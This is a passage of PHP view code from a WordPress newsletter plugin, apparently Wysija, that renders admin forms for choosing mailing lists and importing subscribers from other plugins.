		    $fieldHTML.=$helper_form->checkbox(array('class' => 'validate[minCheckbox[1]] checkbox', 'id' => $field.$list['list_id'], 'name' => "wysija[user_list][$field][]"), $list['list_id']).'<span>'.$list['name'].'</span>';
		    $fieldHTML.='</label> ';
		    $fieldHTML.='<span id="blocknewlist">'.$helper_form->input(array('class' => 'validate[required]', 'id' => 'namenewlist', 'size' => 30, 'name' => 'wysija[list][newlistname]', 'value' => __('Type name of your new list', WYSIJA))).'</span></p>';
		}
		else
		{
		    $fieldHTML.= '<p><label for="'.$field.$list['list_id'].'">'.$helper_form->checkbox(array('class' => 'validate[minCheckbox[1]] checkbox', 'id' => $field.$list['list_id'], 'name' => "wysija[user_list][$field][]"), $list['list_id']).$list['name'];

		    if (isset($follow_up_name_per_list[$list['list_id']]))
		    {
			$fieldHTML.=' <span style="margin-left:10px;"><strong>'.__('Note:', WYSIJA).' </strong>'.sprintf(__('subscribers will receive "%1$s" after import.', WYSIJA), implode(', ', $follow_up_name_per_list[$list['list_id']])).'</span>';
		    }
		    $fieldHTML.='</label></p>';
		}
	    }

	    $fieldHTML .= '</div>';
	    echo $fieldHTML;
	    ?>
	    	</td>
	    	</tr>
	    	</tbody>
	        </table>
	        <p class="submit">
	    <?php $this->secure(array('action' => 'import_save')); ?>
	    	<input type="hidden" value="<?php echo esc_attr($data['dataImport']) ?>" name="wysija[dataImport]" />

	    	<input type="hidden" value="import_save" name="action" />
	    	<input type="submit" value="<?php echo esc_attr(__('Import', WYSIJA)) ?>" class="button-primary wysija">
	        </p>
	    <?php
	}
	?>
	</form>
	<?php
    }

    function import_save($data)
    {
	return false;
    }

    function importplugins($data)
    {
	echo '<form class="form-valid" action="admin.php?page=wysija_subscribers&action=lists" id="wysija-edit" method="post"  name="wysija-edit">';
	echo '<ul>';
	$config = WYSIJA::get('config', 'model');
	$imported_already = $config->getValue('pluginsImportedEgg');
	foreach ($data['plugins'] as $tablename => $pluginInfos)
	{
	    if (is_array($imported_already) && in_array($tablename, $imported_already))
		continue;
	    echo '<li><label for="import-'.$tablename.'1">';
	    echo sprintf(__('Import the %1$s subscribers from the plugin: %2$s ', WYSIJA), "<strong>".$pluginInfos['total']."</strong>", "<strong>".$pluginInfos['name']."</strong>").'</label>';
	    echo '<label for="import-'.$tablename.'1"><input checked="checked" type="radio" id="import-'.$tablename.'1" name="wysija[import]['.$tablename.']" value="1" />'.__('Yes', WYSIJA).'</label>';
	    echo '<label for="import-'.$tablename.'0"><input type="radio" id="import-'.$tablename.'0" name="wysija[import]['.$tablename.']" value="0" />'.__('No', WYSIJA).'</label>';
	    echo '</li>';
	}
	echo '</ul>';
	?>
	<p class="submit">
	<?php $this->secure(array('action' => "importpluginsave")); ?>
	    <input type="hidden" value="importpluginsave" name="action" />
	    <input type="submit" value="<?php echo esc_attr(__('Import', WYSIJA)) ?>" class="button-primary wysija">
	</p>
	<?php
	echo '</form>';
    }
}
